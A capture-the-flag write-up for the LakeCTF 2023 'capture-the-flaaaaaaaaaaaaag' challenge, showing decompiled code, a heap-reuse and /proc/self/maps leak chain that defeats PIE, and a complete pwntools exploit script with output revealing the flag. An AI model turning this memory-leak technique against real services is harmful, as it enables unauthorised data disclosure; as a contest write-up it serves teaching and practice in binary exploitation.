# 2023 LakeCTF - capture-the-flaaaaaaaaaaaaag

This binary allows only 4 actions to execute on the menu:
```
$ cat flaaaaaaaaaaaaag 
flag{fake}
$ ./capture_the_flaaaaaaaaaaaaag 
At polygl0ts we are very cool, so you get the first flaaaaaaaaaaaaag character for free : f
Figure out the rest yourself !
You have 4 action(s) left
1 - read from file
2 - read from memory
3 - send feedback
> 
```

We can: read from file, from memory or send feedback. We reverse engineer to find potential vulnerabilities.

Here is reading from file:
```
  if (choice == 1) {
    printf("filename > ");
    n = read(stdin->_fileno,filename,0x10);
    n_int = (int)n;
    if (n_int < 1) {
      filename._0_8_ = filename._0_8_ & 0xffffffffffffff00;
    }
    else {
      filename[n_int + -1] = '\0';
    }
    fptr = fopen(filename,"r");
    if (fptr == (FILE *)0x0) {
      printf("cannot fopen %s\n",filename);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    pcVar2 = fgets(fcontent,0x10,fptr);
    if (pcVar2 == (char *)0x0) {
      printf("cannot fgets %s\n",filename);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    iVar1 = fclose(fptr);
    if (iVar1 != 0) {
      printf("cannot fclose %s\n",filename);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    puts(fcontent);
  }
```

Reading from memory:
```
  else if (choice == 2) {
    address = (char *)0x0;
    printf("address > ");
    __isoc99_scanf(&DAT_00102098,&address);
    puts(address);
  }
```

Sending feedback:
```
  else {
    if (choice != 3) {
      puts("invalid choice");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_48 = 0;
    if (feedback == 0) {
      puts("please share your thoughts with us");
      printf("> ");
      getline((char **)&feedback,(size_t *)&DAT_00104058,stdin);
      puts("thank you !");
    }
    else {
      puts("sorry, but that\'s enough criticism for today !");
    }
  }
```

One very important point here is that the `flaaaaaaaaaaaaag` file is read when binary starts to print the first letter:
```
  local_18 = fopen("flaaaaaaaaaaaaag","r");
  if (local_18 == (FILE *)0x0) {
    puts("cannot fopen the flaaaaaaaaaaaaag");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar2 = fread(&local_1d,1,1,local_18);
  if (sVar2 == 0) {
    puts("cannot fread the flaaaaaaaaaaaaag");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = fclose(local_18);
  if (iVar1 != 0) {
    puts("cannot fclose the flaaaaaaaaaaaaag");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("At polygl0ts we are very cool, so you get the first flaaaaaaaaaaaaag character for free : %c\n"
         ,(ulong)(uint)(int)local_1d);
```

Additionally, reading the `flaaaaaaaaaaaaag` file through option one is not possible since only 15 bytes of input is read:
```
$ ./capture_the_flaaaaaaaaaaaaag 
At polygl0ts we are very cool, so you get the first flaaaaaaaaaaaaag character for free : f
Figure out the rest yourself !
You have 4 action(s) left
1 - read from file
2 - read from memory
3 - send feedback
> 1
filename > flaaaaaaaaaaaaag
cannot fopen flaaaaaaaaaaaaa
```

## Leaking the flag contents from memory

The binary is quite hardened:
```
pwndbg> checksec
[*] '/home/vm/Downloads/lakectf/ctflaaag/capture_the_flaaaaaaaaaaaaag'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Due to its security controls, it is not really expected that we should overflow something and simply pop a shell. Option to read from memory, along with the flag contents being loaded on startup, kind of hints that we need to leak the flag contents.

Here are some circumstances that were observed during binary analysis:
- binary is reusing heap memory for `feedback` variable
  - memory reuse means that the flag is initially stored in the `feedback` memory region and overwritten later when "sending feedback"
  - if we send an empty feedback, we will overwrite at most 2 bytes of the flag which are known to us (all flags start with `EPFL`), the rest of the flag stays put
- due to PIE we need a leak
  - we can read from a file, meaning that we can also read `/proc/self/maps`, effectively leaking the first memory region address
- we can leak the flag by using the "read from memory" option, but we need to obtain an address somehow
  - the `feedback` variable is stored in the `.bss` region of the binary, meaning that we can at any time access the memory to where the `feedback` variable is pointing to

Due to these circumstances we can perform the following chain of actions:
1. give feedback first and send an empty string, overwriting just the first two bytes of the flag (`\n\x00`)
2. read `/proc/self/maps` and leak the first memory region address
3. when we have the first memory region address, we know where `.bss` section is (the offset is fixed to 0x4000)
4. inside `.bss` section there is `(char*)feedback` variable on a fixed offset of 0x50, pointing to our feedback (flag contents if we do not overwrite)
5. obtaining the `feedback` pointer value, we can request to "read from memory" and leak the flag

```
import sys

from pwn import *

if len(sys.argv) == 1:
    r = process("./capture_the_flaaaaaaaaaaaaag")
elif len(sys.argv) == 2:
    r = remote("chall.polygl0ts.ch", 9003)
else:
    r = gdb.debug("./capture_the_flaaaaaaaaaaaaag", '''set follow-fork-mode parent
b main
b menu
continue
''')

# give empty feedback first
r.recvuntil(b"> ")
r.sendline(b"3")
r.recvuntil(b"> ")
r.sendline(b"")

# read /proc/self/maps
r.recvuntil(b"> ")
r.sendline(b"1")
r.recvuntil(b"> ")
r.sendline(b"/proc/self/maps")
# retrieve start address / first memory region
start = int(r.recvline().split(b"-")[0], 16)
print(hex(start))

# read from memory - feedback pointer value
r.recvuntil(b"> ")
r.sendline(b"2")
r.recvuntil(b"> ")
bss = start + 0x4000
print(hex(bss))
feedback = bss + 0x50
print(hex(feedback))
r.sendline(hex(feedback).encode())

# the value we get is the address of where the flag was stored
flag = int.from_bytes(r.recvline()[:-1], 'little')

# read from memory again - this time where the flag was stored, without the first few bytes
r.recvuntil(b"> ")
r.sendline(b"2")
r.recvuntil(b"> ")
r.sendline(hex(flag+3).encode())
r.interactive()
```

Executing the script renders the flag (or at least its most important part):
```
$ python3 xpl.py a
[+] Opening connection to chall.polygl0ts.ch on port 9003: Done
0x55b46a946000
0x55b46a94a000
0x55b46a94a050
[*] Switching to interactive mode
L{why_h4ve_a_s1ngle_ch4r4ct3r_wh3n_fread_gives_you_7he_wh0l3_fl4g}

no actions left :(
[*] Got EOF while reading in interactive
$ 
```
